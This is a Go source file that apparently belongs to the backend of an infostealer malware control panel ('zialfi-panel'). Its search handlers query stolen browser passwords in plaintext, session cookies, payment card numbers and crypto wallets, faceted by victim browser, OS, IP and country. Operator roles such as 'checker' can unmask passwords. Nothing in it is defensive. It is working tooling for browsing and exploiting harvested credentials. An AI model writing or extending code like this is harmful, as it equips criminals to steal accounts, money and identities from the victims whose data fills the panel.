package api

import (
	"database/sql"
	"fmt"
	"net/http"
	"strconv"
	"strings"

	"zialfi-panel/internal/db"
	"zialfi-panel/internal/middleware"
)

type SearchHandler struct {
	db *sql.DB
}

func NewSearchHandler(db *sql.DB) *SearchHandler {
	return &SearchHandler{db: db}
}

type searchResult struct {
	SessionID string `json:"session_id"`
	Type      string `json:"type"`
	Value     string `json:"value"`
	Context   string `json:"context"`
	CreatedAt string `json:"created_at"`
}

type Facets struct {
	Browsers map[string]int `json:"browsers"`
	OS       map[string]int `json:"os"`
	Domains  map[string]int `json:"domains"`
}

func (h *SearchHandler) Search(w http.ResponseWriter, r *http.Request) {
	q := strings.TrimSpace(r.URL.Query().Get("q"))
	if q == "" || len(q) < 2 {
		writeJSON(w, http.StatusOK, map[string]any{"results": []searchResult{}, "total": 0})
		return
	}

	typ := r.URL.Query().Get("type")
	page, _ := strconv.Atoi(r.URL.Query().Get("page"))
	if page < 1 {
		page = 1
	}
	perPage, _ := strconv.Atoi(r.URL.Query().Get("per_page"))
	if perPage < 1 || perPage > 100 {
		perPage = 50
	}

	like := "%" + q + "%"
	offset := (page - 1) * perPage

	ownerClause := ""
	var ownerArg any
	if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
		ownerClause = " AND s.owner_id = ?"
		ownerArg = claims.UserID
	}

	type queryDef struct {
		name  string
		query string
		count string
	}

	queries := []queryDef{
		{"password", "SELECT p.session_id, 'password', p.url, p.username, s.created_at FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE (p.url LIKE ? OR p.username LIKE ? OR p.password_value LIKE ?)" + ownerClause,
			"SELECT COUNT(*) FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE (p.url LIKE ? OR p.username LIKE ? OR p.password_value LIKE ?)" + ownerClause},
		{"cookie", "SELECT c.session_id, 'cookie', c.name, c.domain, s.created_at FROM cookies c JOIN sessions s ON s.id = c.session_id WHERE (c.name LIKE ? OR c.domain LIKE ? OR c.value LIKE ?)" + ownerClause,
			"SELECT COUNT(*) FROM cookies c JOIN sessions s ON s.id = c.session_id WHERE (c.name LIKE ? OR c.domain LIKE ? OR c.value LIKE ?)" + ownerClause},
		{"card", "SELECT c.session_id, 'card', c.holder, c.number, s.created_at FROM cards c JOIN sessions s ON s.id = c.session_id WHERE (c.holder LIKE ? OR c.number LIKE ?)" + ownerClause,
			"SELECT COUNT(*) FROM cards c JOIN sessions s ON s.id = c.session_id WHERE (c.holder LIKE ? OR c.number LIKE ?)" + ownerClause},
		{"wallet", "SELECT w.session_id, 'wallet', w.name, w.path, s.created_at FROM wallets w JOIN sessions s ON s.id = w.session_id WHERE w.name LIKE ?" + ownerClause,
			"SELECT COUNT(*) FROM wallets w JOIN sessions s ON s.id = w.session_id WHERE w.name LIKE ?" + ownerClause},
	}

	switch typ {
	case "passwords":
		typ = "password"
	case "cookies":
		typ = "cookie"
	case "cards":
		typ = "card"
	case "wallets":
		typ = "wallet"
	}

	if typ == "password" || typ == "cookie" || typ == "card" || typ == "wallet" {
		queries = []queryDef{queries[map[string]int{"password": 0, "cookie": 1, "card": 2, "wallet": 3}[typ]]}
	}

	var allResults = make([]searchResult, 0)
	var total int

	for _, qd := range queries {
		if typ == "" || typ == qd.name {
			var queryArgs []any
			switch qd.name {
			case "password", "cookie":
				queryArgs = []any{like, like, like}
			case "card":
				queryArgs = []any{like, like}
			case "wallet":
				queryArgs = []any{like}
			}
			if ownerClause != "" {
				queryArgs = append(queryArgs, ownerArg)
			}
			var subTotal int
			db.QueryRow(h.db, qd.count, queryArgs...).Scan(&subTotal)
			total += subTotal

			if subTotal > 0 {
				qargs := append(queryArgs, perPage, offset)
				rows, err := db.Query(h.db, qd.query+" ORDER BY s.created_at DESC LIMIT ? OFFSET ?", qargs...)
				if err != nil {
					continue
				}
				for rows.Next() {
					var r searchResult
					if rows.Scan(&r.SessionID, &r.Type, &r.Value, &r.Context, &r.CreatedAt) == nil {
						allResults = append(allResults, r)
					}
				}
				rows.Close()
			}
		}
	}

	writeJSON(w, http.StatusOK, map[string]any{
		"results": allResults,
		"total":   total,
		"page":    page,
		"perPage": perPage,
	})
}

func (h *SearchHandler) AdvancedSearch(w http.ResponseWriter, r *http.Request) {
	q := strings.TrimSpace(r.URL.Query().Get("q"))
	osFilter := r.URL.Query().Get("os")
	browserFilter := r.URL.Query().Get("browser")
	dateFrom := r.URL.Query().Get("date_from")
	dateTo := r.URL.Query().Get("date_to")

	claims, hasClaims := getClaims(r)
	canRevealPasswords := hasClaims && (claims.Role == "admin" || claims.Role == "checker")

	page, _ := strconv.Atoi(r.URL.Query().Get("page"))
	if page < 1 {
		page = 1
	}
	perPage, _ := strconv.Atoi(r.URL.Query().Get("per_page"))
	if perPage < 1 || perPage > 100 {
		perPage = 50
	}

	var passwordConds []string
	var passwordArgs []any
	var sessionConds []string
	var sessionArgs []any

	if q != "" {
		like := "%" + q + "%"
		passwordConds = append(passwordConds, "(p.url LIKE ? OR p.username LIKE ? OR p.password_value LIKE ?)")
		passwordArgs = append(passwordArgs, like, like, like)
	}
	if osFilter != "" {
		sessionConds = append(sessionConds, "s.os = ?")
		sessionArgs = append(sessionArgs, osFilter)
	}
	if browserFilter != "" {
		passwordConds = append(passwordConds, "p.browser = ?")
		passwordArgs = append(passwordArgs, browserFilter)
	}
	if dateFrom != "" {
		sessionConds = append(sessionConds, "s.created_at >= ?")
		sessionArgs = append(sessionArgs, dateFrom)
	}
	if dateTo != "" {
		sessionConds = append(sessionConds, "s.created_at <= ?")
		sessionArgs = append(sessionArgs, dateTo+" 23:59:59")
	}

	if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
		sessionConds = append(sessionConds, "s.owner_id = ?")
		sessionArgs = append(sessionArgs, claims.UserID)
	}

	allConds := append(append([]string{}, passwordConds...), sessionConds...)
	allArgs := append(append([]any{}, passwordArgs...), sessionArgs...)

	sessionWhere := ""
	if len(allConds) > 0 {
		sessionWhere = " AND " + strings.Join(allConds, " AND ")
	}

	countQuery := "SELECT COUNT(*) FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE 1=1" + sessionWhere
	var total int
	db.QueryRow(h.db, countQuery, allArgs...).Scan(&total)

	offset := (page - 1) * perPage
	dataQuery := fmt.Sprintf(`SELECT p.session_id, p.url, p.username, p.password_value, p.browser, s.os, s.ip, s.country_code, s.created_at
		FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE 1=1%s ORDER BY s.created_at DESC LIMIT ? OFFSET ?`, sessionWhere)
	qargs := append(allArgs, perPage, offset)

	rows, err := db.Query(h.db, dataQuery, qargs...)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "search failed")
		return
	}
	defer rows.Close()

	type advancedResult struct {
		SessionID   string `json:"session_id"`
		URL         string `json:"url"`
		Username    string `json:"username"`
		Password    string `json:"password"`
		Browser     string `json:"browser"`
		OS          string `json:"os"`
		IP          string `json:"ip"`
		CountryCode string `json:"country_code"`
		CreatedAt   string `json:"created_at"`
	}

	results := make([]advancedResult, 0)
	for rows.Next() {
		var r advancedResult
		if rows.Scan(&r.SessionID, &r.URL, &r.Username, &r.Password, &r.Browser, &r.OS, &r.IP, &r.CountryCode, &r.CreatedAt) == nil {
			if !canRevealPasswords {
				r.Password = "[MASKED]"
			}
			results = append(results, r)
		}
	}

	pages := (total + perPage - 1) / perPage

	facets := h.buildAdvancedFacets(passwordConds, sessionConds, passwordArgs, sessionArgs)

	writeJSON(w, http.StatusOK, map[string]any{
		"results":  results,
		"total":    total,
		"page":     page,
		"per_page": perPage,
		"pages":    pages,
		"facets":   facets,
	})
}

func (h *SearchHandler) buildAdvancedFacets(passwordConds, sessionConds []string, passwordArgs, sessionArgs []any) Facets {
	facets := Facets{
		Browsers: make(map[string]int),
		OS:       make(map[string]int),
		Domains:  make(map[string]int),
	}

	passwordWhere := " WHERE 1=1"
	if len(passwordConds) > 0 {
		passwordWhere += " AND " + strings.Join(passwordConds, " AND ")
	}
	sessionWhere := " WHERE 1=1"
	if len(sessionConds) > 0 {
		sessionWhere += " AND " + strings.Join(sessionConds, " AND ")
	}
	passwordAllArgs := append(append([]any{}, passwordArgs...), sessionArgs...)

	rows, err := db.Query(h.db, "SELECT p.browser, COUNT(*) as cnt FROM passwords p JOIN sessions s ON s.id = p.session_id"+passwordWhere+" GROUP BY p.browser ORDER BY cnt DESC LIMIT 10", passwordAllArgs...)
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			var name string
			var cnt int
			if rows.Scan(&name, &cnt) == nil && name != "" {
				facets.Browsers[name] = cnt
			}
		}
	}

	rows2, err := db.Query(h.db, "SELECT s.os, COUNT(*) as cnt FROM sessions s"+sessionWhere+" GROUP BY s.os ORDER BY cnt DESC LIMIT 10", sessionArgs...)
	if err == nil {
		defer rows2.Close()
		for rows2.Next() {
			var name string
			var cnt int
			if rows2.Scan(&name, &cnt) == nil && name != "" {
				facets.OS[name] = cnt
			}
		}
	}

	rows3, err := db.Query(h.db, "SELECT c.domain, COUNT(*) as cnt FROM cookies c JOIN sessions s ON s.id = c.session_id"+sessionWhere+" GROUP BY c.domain ORDER BY cnt DESC LIMIT 10", sessionArgs...)
	if err == nil {
		defer rows3.Close()
		for rows3.Next() {
			var name string
			var cnt int
			if rows3.Scan(&name, &cnt) == nil && name != "" {
				facets.Domains[name] = cnt
			}
		}
	}

	return facets
}
